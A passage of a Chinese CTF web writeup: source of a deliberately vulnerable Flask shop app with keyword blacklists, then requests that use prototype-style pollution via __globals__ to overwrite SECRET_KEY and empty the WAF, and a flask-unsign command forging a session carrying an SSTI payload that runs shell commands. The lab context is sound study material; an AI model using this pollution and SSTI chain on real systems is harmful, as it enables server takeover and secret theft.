</span></span></span><span class="line"><span class="ln"> 61</span><span class="cl"><span class="s1">                            .then(data =&gt; alert(data))
</span></span></span><span class="line"><span class="ln"> 62</span><span class="cl"><span class="s1">                            .catch(error =&gt; console.error(&#39;错误:&#39;, error));
</span></span></span><span class="line"><span class="ln"> 63</span><span class="cl"><span class="s1">                        }
</span></span></span><span class="line"><span class="ln"> 64</span><span class="cl"><span class="s1">                    &lt;/script&gt;
</span></span></span><span class="line"><span class="ln"> 65</span><span class="cl"><span class="s1">                &lt;/body&gt;
</span></span></span><span class="line"><span class="ln"> 66</span><span class="cl"><span class="s1">            &lt;/html&gt;
</span></span></span><span class="line"><span class="ln"> 67</span><span class="cl"><span class="s1">        &#39;&#39;&#39;</span>
</span></span><span class="line"><span class="ln"> 68</span><span class="cl">    <span class="k">elif</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s1">&#39;POST&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 69</span><span class="cl">        <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">data</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 70</span><span class="cl">            <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 71</span><span class="cl">                <span class="n">raw_data</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">data</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 72</span><span class="cl">                <span class="k">if</span> <span class="n">check</span><span class="p">(</span><span class="n">raw_data</span><span class="p">):</span>
</span></span><span class="line"><span class="ln"> 73</span><span class="cl">                <span class="c1">#检测添加的商品是否合法</span>
</span></span><span class="line"><span class="ln"> 74</span><span class="cl">                    <span class="k">return</span> <span class="s2">&#34;该商品违规，无法上传&#34;</span>
</span></span><span class="line"><span class="ln"> 75</span><span class="cl">                <span class="n">json_data</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">raw_data</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 76</span><span class="cl">
</span></span><span class="line"><span class="ln"> 77</span><span class="cl">                <span class="k">if</span> <span class="ow">not</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">json_data</span><span class="p">,</span> <span class="nb">dict</span><span class="p">):</span>
</span></span><span class="line"><span class="ln"> 78</span><span class="cl">                    <span class="k">return</span> <span class="s2">&#34;添加失败1&#34;</span>
</span></span><span class="line"><span class="ln"> 79</span><span class="cl">
</span></span><span class="line"><span class="ln"> 80</span><span class="cl">                <span class="n">merge</span><span class="p">(</span><span class="n">json_data</span><span class="p">,</span> <span class="n">add</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 81</span><span class="cl">                <span class="k">return</span> <span class="s2">&#34;你无法添加商品哦&#34;</span>
</span></span><span class="line"><span class="ln"> 82</span><span class="cl">
</span></span><span class="line"><span class="ln"> 83</span><span class="cl">            <span class="k">except</span> <span class="p">(</span><span class="ne">UnicodeDecodeError</span><span class="p">,</span> <span class="n">json</span><span class="o">.</span><span class="n">JSONDecodeError</span><span class="p">):</span>
</span></span><span class="line"><span class="ln"> 84</span><span class="cl">                <span class="k">return</span> <span class="s2">&#34;添加失败2&#34;</span>
</span></span><span class="line"><span class="ln"> 85</span><span class="cl">            <span class="k">except</span> <span class="ne">TypeError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 86</span><span class="cl">                <span class="k">return</span> <span class="sa">f</span><span class="s2">&#34;添加失败3&#34;</span>
</span></span><span class="line"><span class="ln"> 87</span><span class="cl">            <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 88</span><span class="cl">                <span class="k">return</span> <span class="sa">f</span><span class="s2">&#34;添加失败4&#34;</span>
</span></span><span class="line"><span class="ln"> 89</span><span class="cl">        <span class="k">return</span> <span class="s2">&#34;添加失败5&#34;</span>
</span></span><span class="line"><span class="ln"> 90</span><span class="cl">
</span></span><span class="line"><span class="ln"> 91</span><span class="cl">
</span></span><span class="line"><span class="ln"> 92</span><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/aaadminnn&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="ln"> 93</span><span class="cl"><span class="k">def</span> <span class="nf">admin</span><span class="p">():</span>
</span></span><span class="line"><span class="ln"> 94</span><span class="cl">    <span class="k">if</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;name&#39;</span><span class="p">)</span> <span class="o">==</span> <span class="s2">&#34;admin&#34;</span> <span class="ow">and</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;permission&#39;</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 95</span><span class="cl">        <span class="n">permission</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;permission&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 96</span><span class="cl">        <span class="k">if</span> <span class="n">check1</span><span class="p">(</span><span class="n">permission</span><span class="p">):</span>
</span></span><span class="line"><span class="ln"> 97</span><span class="cl">            <span class="c1"># 检测添加的商品是否合法</span>
</span></span><span class="line"><span class="ln"> 98</span><span class="cl">            <span class="k">return</span> <span class="s2">&#34;非法权限&#34;</span>
</span></span><span class="line"><span class="ln"> 99</span><span class="cl">
</span></span><span class="line"><span class="ln">100</span><span class="cl">        <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s1">&#39;POST&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">101</span><span class="cl">            <span class="k">return</span> <span class="s1">&#39;&lt;script&gt;alert(&#34;上传成功！&#34;);window.location.href=&#34;/aaadminnn&#34;;&lt;/script&gt;&#39;</span>
</span></span><span class="line"><span class="ln">102</span><span class="cl">
</span></span><span class="line"><span class="ln">103</span><span class="cl">        <span class="n">upload_form</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;
</span></span></span><span class="line"><span class="ln">104</span><span class="cl"><span class="s1">        &lt;h2&gt;商品管理系统&lt;/h2&gt;
</span></span></span><span class="line"><span class="ln">105</span><span class="cl"><span class="s1">        &lt;form method=POST enctype=multipart/form-data style=&#34;margin:20px;padding:20px;border:1px solid #ccc&#34;&gt;
</span></span></span><span class="line"><span class="ln">106</span><span class="cl"><span class="s1">            &lt;h3&gt;上传新商品&lt;/h3&gt;
</span></span></span><span class="line"><span class="ln">107</span><span class="cl"><span class="s1">            &lt;input type=file name=file required style=&#34;margin:10px&#34;&gt;&lt;br&gt;
</span></span></span><span class="line"><span class="ln">108</span><span class="cl"><span class="s1">            &lt;small&gt;支持格式：jpg/png（最大2MB）&lt;/small&gt;&lt;br&gt;
</span></span></span><span class="line"><span class="ln">109</span><span class="cl"><span class="s1">            &lt;input type=submit value=&#34;立即上传&#34; style=&#34;margin:10px;padding:5px 20px&#34;&gt;
</span></span></span><span class="line"><span class="ln">110</span><span class="cl"><span class="s1">        &lt;/form&gt;
</span></span></span><span class="line"><span class="ln">111</span><span class="cl"><span class="s1">        &#39;&#39;&#39;</span>
</span></span><span class="line"><span class="ln">112</span><span class="cl">
</span></span><span class="line"><span class="ln">113</span><span class="cl">        <span class="n">original_template</span> <span class="o">=</span> <span class="s1">&#39;Hello admin!!!Your permissions are</span><span class="si">{}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">permission</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">114</span><span class="cl">        <span class="n">new_template</span> <span class="o">=</span> <span class="n">original_template</span> <span class="o">+</span> <span class="n">upload_form</span>
</span></span><span class="line"><span class="ln">115</span><span class="cl">
</span></span><span class="line"><span class="ln">116</span><span class="cl">        <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span><span class="n">new_template</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">117</span><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">118</span><span class="cl">        <span class="k">return</span> <span class="s2">&#34;&lt;script&gt;alert(&#39;You are not an admin&#39;);window.location.href=&#39;/&#39;&lt;/script&gt;&#34;</span>
</span></span><span class="line"><span class="ln">119</span><span class="cl">
</span></span><span class="line"><span class="ln">120</span><span class="cl">
</span></span><span class="line"><span class="ln">121</span><span class="cl">
</span></span><span class="line"><span class="ln">122</span><span class="cl">
</span></span><span class="line"><span class="ln">123</span><span class="cl"><span class="k">def</span> <span class="nf">merge</span><span class="p">(</span><span class="n">src</span><span class="p">,</span> <span class="n">dst</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">124</span><span class="cl">    <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">src</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
</span></span><span class="line"><span class="ln">125</span><span class="cl">        <span class="k">if</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="s1">&#39;__getitem__&#39;</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">126</span><span class="cl">            <span class="k">if</span> <span class="n">dst</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">k</span><span class="p">)</span> <span class="ow">and</span> <span class="nb">type</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="o">==</span> <span class="nb">dict</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">127</span><span class="cl">                <span class="n">merge</span><span class="p">(</span><span class="n">v</span><span class="p">,</span> <span class="n">dst</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">k</span><span class="p">))</span>
</span></span><span class="line"><span class="ln">128</span><span class="cl">            <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">129</span><span class="cl">                <span class="n">dst</span><span class="p">[</span><span class="n">k</span><span class="p">]</span> <span class="o">=</span> <span class="n">v</span>
</span></span><span class="line"><span class="ln">130</span><span class="cl">        <span class="k">elif</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">)</span> <span class="ow">and</span> <span class="nb">type</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="o">==</span> <span class="nb">dict</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">131</span><span class="cl">            <span class="n">merge</span><span class="p">(</span><span class="n">v</span><span class="p">,</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">))</span>
</span></span><span class="line"><span class="ln">132</span><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">133</span><span class="cl">            <span class="nb">setattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">134</span><span class="cl">
</span></span><span class="line"><span class="ln">135</span><span class="cl">
</span></span><span class="line"><span class="ln">136</span><span class="cl"><span class="k">def</span> <span class="nf">check</span><span class="p">(</span><span class="n">raw_data</span><span class="p">,</span> <span class="n">forbidden_keywords</span><span class="o">=</span><span class="kc">None</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">137</span><span class="cl">    <span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="ln">138</span><span class="cl"><span class="s2">    检查原始数据中是否包含禁止的关键词
</span></span></span><span class="line"><span class="ln">139</span><span class="cl"><span class="s2">    如果包含禁止关键词返回 True，否则返回 False
</span></span></span><span class="line"><span class="ln">140</span><span class="cl"><span class="s2">    &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="ln">141</span><span class="cl">    <span class="c1"># 设置默认禁止关键词</span>
</span></span><span class="line"><span class="ln">142</span><span class="cl">    <span class="k">if</span> <span class="n">forbidden_keywords</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">143</span><span class="cl">        <span class="n">forbidden_keywords</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;app&#34;</span><span class="p">,</span> <span class="s2">&#34;config&#34;</span><span class="p">,</span> <span class="s2">&#34;init&#34;</span><span class="p">,</span> <span class="s2">&#34;globals&#34;</span><span class="p">,</span> <span class="s2">&#34;flag&#34;</span><span class="p">,</span> <span class="s2">&#34;SECRET&#34;</span><span class="p">,</span> <span class="s2">&#34;pardir&#34;</span><span class="p">,</span> <span class="s2">&#34;class&#34;</span><span class="p">,</span> <span class="s2">&#34;mro&#34;</span><span class="p">,</span> <span class="s2">&#34;subclasses&#34;</span><span class="p">,</span> <span class="s2">&#34;builtins&#34;</span><span class="p">,</span> <span class="s2">&#34;eval&#34;</span><span class="p">,</span> <span class="s2">&#34;os&#34;</span><span class="p">,</span> <span class="s2">&#34;open&#34;</span><span class="p">,</span> <span class="s2">&#34;file&#34;</span><span class="p">,</span> <span class="s2">&#34;import&#34;</span><span class="p">,</span> <span class="s2">&#34;cat&#34;</span><span class="p">,</span> <span class="s2">&#34;ls&#34;</span><span class="p">,</span> <span class="s2">&#34;/&#34;</span><span class="p">,</span> <span class="s2">&#34;base&#34;</span><span class="p">,</span> <span class="s2">&#34;url&#34;</span><span class="p">,</span> <span class="s2">&#34;read&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="ln">144</span><span class="cl">
</span></span><span class="line"><span class="ln">145</span><span class="cl">    <span class="c1"># 检查是否包含任何禁止关键词</span>
</span></span><span class="line"><span class="ln">146</span><span class="cl">    <span class="k">return</span> <span class="nb">any</span><span class="p">(</span><span class="n">keyword</span> <span class="ow">in</span> <span class="n">raw_data</span> <span class="k">for</span> <span class="n">keyword</span> <span class="ow">in</span> <span class="n">forbidden_keywords</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">147</span><span class="cl">
</span></span><span class="line"><span class="ln">148</span><span class="cl">
</span></span><span class="line"><span class="ln">149</span><span class="cl"><span class="n">param_black_list</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;config&#39;</span><span class="p">,</span> <span class="s1">&#39;session&#39;</span><span class="p">,</span> <span class="s1">&#39;url&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\\</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;&lt;&#39;</span><span class="p">,</span> <span class="s1">&#39;&gt;&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="si">%1c</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="si">%1d</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="si">%1f</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="si">%1e</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;%20&#39;</span><span class="p">,</span> <span class="s1">&#39;%2b&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="si">%2c</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="si">%3c</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="si">%3e</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="si">%c</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="si">%2f</span><span class="s1">&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">150</span><span class="cl">                    <span class="s1">&#39;b64decode&#39;</span><span class="p">,</span> <span class="s1">&#39;base64&#39;</span><span class="p">,</span> <span class="s1">&#39;encode&#39;</span><span class="p">,</span> <span class="s1">&#39;chr&#39;</span><span class="p">,</span> <span class="s1">&#39;[&#39;</span><span class="p">,</span> <span class="s1">&#39;]&#39;</span><span class="p">,</span> <span class="s1">&#39;os&#39;</span><span class="p">,</span> <span class="s1">&#39;cat&#39;</span><span class="p">,</span>  <span class="s1">&#39;flag&#39;</span><span class="p">,</span>  <span class="s1">&#39;set&#39;</span><span class="p">,</span>  <span class="s1">&#39;self&#39;</span><span class="p">,</span> <span class="s1">&#39;%&#39;</span><span class="p">,</span> <span class="s1">&#39;file&#39;</span><span class="p">,</span>  <span class="s1">&#39;pop(&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">151</span><span class="cl">                    <span class="s1">&#39;setdefault&#39;</span><span class="p">,</span> <span class="s1">&#39;char&#39;</span><span class="p">,</span> <span class="s1">&#39;lipsum&#39;</span><span class="p">,</span> <span class="s1">&#39;update&#39;</span><span class="p">,</span> <span class="s1">&#39;=&#39;</span><span class="p">,</span> <span class="s1">&#39;if&#39;</span><span class="p">,</span> <span class="s1">&#39;print&#39;</span><span class="p">,</span> <span class="s1">&#39;env&#39;</span><span class="p">,</span> <span class="s1">&#39;endfor&#39;</span><span class="p">,</span> <span class="s1">&#39;code&#39;</span><span class="p">,</span> <span class="s1">&#39;=&#39;</span> <span class="p">]</span>
</span></span><span class="line"><span class="ln">152</span><span class="cl">
</span></span><span class="line"><span class="ln">153</span><span class="cl">
</span></span><span class="line"><span class="ln">154</span><span class="cl"><span class="c1"># 增强WAF防护</span>
</span></span><span class="line"><span class="ln">155</span><span class="cl"><span class="k">def</span> <span class="nf">waf_check</span><span class="p">(</span><span class="n">value</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">156</span><span class="cl">    <span class="c1"># 检查是否有不合法的字符</span>
</span></span><span class="line"><span class="ln">157</span><span class="cl">    <span class="k">for</span> <span class="n">black</span> <span class="ow">in</span> <span class="n">param_black_list</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">158</span><span class="cl">        <span class="k">if</span> <span class="n">black</span> <span class="ow">in</span> <span class="n">value</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">159</span><span class="cl">            <span class="k">return</span> <span class="kc">False</span>
</span></span><span class="line"><span class="ln">160</span><span class="cl">    <span class="k">return</span> <span class="kc">True</span>
</span></span><span class="line"><span class="ln">161</span><span class="cl">
</span></span><span class="line"><span class="ln">162</span><span class="cl"><span class="c1"># 检查是否是自动化工具请求</span>
</span></span><span class="line"><span class="ln">163</span><span class="cl"><span class="k">def</span> <span class="nf">is_automated_request</span><span class="p">():</span>
</span></span><span class="line"><span class="ln">164</span><span class="cl">    <span class="n">user_agent</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">headers</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;User-Agent&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">165</span><span class="cl">    <span class="c1"># 如果是常见的自动化工具的 User-Agent，返回 True</span>
</span></span><span class="line"><span class="ln">166</span><span class="cl">    <span class="n">automated_agents</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;fenjing&#39;</span><span class="p">,</span> <span class="s1">&#39;curl&#39;</span><span class="p">,</span> <span class="s1">&#39;python&#39;</span><span class="p">,</span> <span class="s1">&#39;bot&#39;</span><span class="p">,</span> <span class="s1">&#39;spider&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="ln">167</span><span class="cl">    <span class="k">return</span> <span class="nb">any</span><span class="p">(</span><span class="n">agent</span> <span class="ow">in</span> <span class="n">user_agent</span> <span class="k">for</span> <span class="n">agent</span> <span class="ow">in</span> <span class="n">automated_agents</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">168</span><span class="cl">
</span></span><span class="line"><span class="ln">169</span><span class="cl"><span class="k">def</span> <span class="nf">check1</span><span class="p">(</span><span class="n">value</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">170</span><span class="cl">
</span></span><span class="line"><span class="ln">171</span><span class="cl">    <span class="k">if</span> <span class="n">is_automated_request</span><span class="p">():</span>
</span></span><span class="line"><span class="ln">172</span><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Automated tool detected&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">173</span><span class="cl">        <span class="k">return</span> <span class="kc">True</span>
</span></span><span class="line"><span class="ln">174</span><span class="cl">
</span></span><span class="line"><span class="ln">175</span><span class="cl">    <span class="c1"># 使用WAF机制检查请求的合法性</span>
</span></span><span class="line"><span class="ln">176</span><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">waf_check</span><span class="p">(</span><span class="n">value</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">177</span><span class="cl">        <span class="k">return</span> <span class="kc">True</span>
</span></span><span class="line"><span class="ln">178</span><span class="cl">
</span></span><span class="line"><span class="ln">179</span><span class="cl">    <span class="k">return</span> <span class="kc">False</span>
</span></span><span class="line"><span class="ln">180</span><span class="cl">
</span></span><span class="line"><span class="ln">181</span><span class="cl">
</span></span><span class="line"><span class="ln">182</span><span class="cl"><span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s2">&#34;0.0.0.0&#34;</span><span class="p">,</span><span class="n">port</span><span class="o">=</span><span class="mi">5014</span><span class="p">)</span>
</span></span></code></pre></div><p>审计一下源码就可以看到/aaadminnn路由可以ssti</p>
<p>注入点是session中的permission参数</p>
<p>那我们先污染一手SECRET_KEY，然后伪造session</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="nf">POST</span> <span class="nn">/add</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">27.25.151.198:30362</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="n">Sec-Fetch-Dest</span><span class="o">:</span> <span class="l">empty</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="n">Sec-Fetch-Mode</span><span class="o">:</span> <span class="l">cors</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="n">Accept-Language</span><span class="o">:</span> <span class="l">zh-CN,zh;q=0.9</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="n">sec-ch-ua</span><span class="o">:</span> <span class="l">&#34;Google Chrome&#34;;v=&#34;137&#34;, &#34;Chromium&#34;;v=&#34;137&#34;, &#34;Not/A)Brand&#34;;v=&#34;24&#34;</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="n">Referer</span><span class="o">:</span> <span class="l">http://27.25.151.198:30362/add</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="n">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate, br, zstd</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="n">sec-ch-ua-platform</span><span class="o">:</span> <span class="l">&#34;Windows&#34;</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/json</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="n">Origin</span><span class="o">:</span> <span class="l">http://27.25.151.198:30362</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="n">Accept</span><span class="o">:</span> <span class="l">*/*</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="n">Sec-Fetch-Site</span><span class="o">:</span> <span class="l">same-origin</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="n">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="n">sec-ch-ua-mobile</span><span class="o">:</span> <span class="l">?0</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="n">Content-Length</span><span class="o">:</span> <span class="l">3</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="p">{</span><span class="nt">&#34;\u005F\u005F\u0067\u006C\u006F\u0062\u0061\u006C\u0073\u005F\u005F&#34;</span><span class="p">:{</span><span class="nt">&#34;\u0061\u0070\u0070&#34;</span><span class="p">:{</span><span class="nt">&#34;\u0063\u006F\u006E\u0066\u0069\u0067&#34;</span><span class="p">:{</span><span class="nt">&#34;\u0053\u0045\u0043\u0052\u0045\u0054\u005F\u004B\u0045\u0059&#34;</span><span class="p">:</span><span class="s2">&#34;xrntkk&#34;</span><span class="p">}}}}</span>
</span></span></code></pre></div><p>另外把waf污染为空</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="nf">POST</span> <span class="nn">/add</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">27.25.151.198:30362</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="n">Sec-Fetch-Dest</span><span class="o">:</span> <span class="l">empty</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="n">Sec-Fetch-Mode</span><span class="o">:</span> <span class="l">cors</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="n">Accept-Language</span><span class="o">:</span> <span class="l">zh-CN,zh;q=0.9</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="n">sec-ch-ua</span><span class="o">:</span> <span class="l">&#34;Google Chrome&#34;;v=&#34;137&#34;, &#34;Chromium&#34;;v=&#34;137&#34;, &#34;Not/A)Brand&#34;;v=&#34;24&#34;</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="n">Referer</span><span class="o">:</span> <span class="l">http://27.25.151.198:30362/add</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="n">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate, br, zstd</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="n">sec-ch-ua-platform</span><span class="o">:</span> <span class="l">&#34;Windows&#34;</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/json</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="n">Origin</span><span class="o">:</span> <span class="l">http://27.25.151.198:30362</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="n">Accept</span><span class="o">:</span> <span class="l">*/*</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="n">Sec-Fetch-Site</span><span class="o">:</span> <span class="l">same-origin</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="n">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="n">sec-ch-ua-mobile</span><span class="o">:</span> <span class="l">?0</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="n">Content-Length</span><span class="o">:</span> <span class="l">3</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="p">{</span><span class="nt">&#34;\u005F\u005F\u0067\u006C\u006F\u0062\u0061\u006C\u0073\u005F\u005F&#34;</span><span class="p">:{</span><span class="nt">&#34;param_black_list&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">}}</span>
</span></span></code></pre></div><p>Payload:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="ln">1</span><span class="cl">┌──<span class="o">(</span>root㉿XrntsPC<span class="o">)</span>-<span class="o">[</span>/home/xrntkk/flask-session-cookie-manager<span class="o">]</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl">└─# flask-unsign --sign --secret xrntkk -c <span class="s1">&#39;{&#34;name&#34;:&#34;admin&#34;,&#34;permission&#34;:&#34;{{g.pop.__globals__.__builtins__[\&#34;__import__\&#34;](\&#34;os\&#34;).popen(\&#34;cat 4flloog\&#34;).read()}}&#34;}&#39;</span>
</span></span><span class="line"><span class="ln">3</span><span class="cl">.eJwVi8EKwyAQBX-lvFMCIaee-is1LKaxsrDuitqT-O81t5mB6VCfAl7wV2LFhhxK4lrZdMbe454t70RR7PRSiSafP5bGOuXtQMQpW2lEDsfiYNVhvaeg0z6-PZ5fEbN45xL8taxjYPwBAIEp0w.aEP1oA.brg9-lSD1jUcXaCB0RD1A8erqZI
</span></span></code></pre></div><p><img alt="image-20250608222842841" loading="lazy" src="../assets/image-20250608222842841.png"></p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="http://localhost:1313/tags/writeup/">Writeup</a></li>
      <li><a href="http://localhost:1313/tags/ctf/">Ctf</a></li>
      <li><a href="http://localhost:1313/tags/web/">Web</a></li>
    </ul>
<nav class="paginav">
  <a class="next" href="http://localhost:1313/post/d3ctf_2025/">
    <span class="title">下一页 »</span>
    <br>
    <span>D^3CTF-2025-Web-Writeup</span>
  </a>
</nav>

  </footer><div id="tw-comment"></div>
<script>
    
    const getStoredTheme = () => localStorage.getItem("pref-theme") === "light" ? "light" : "dark";
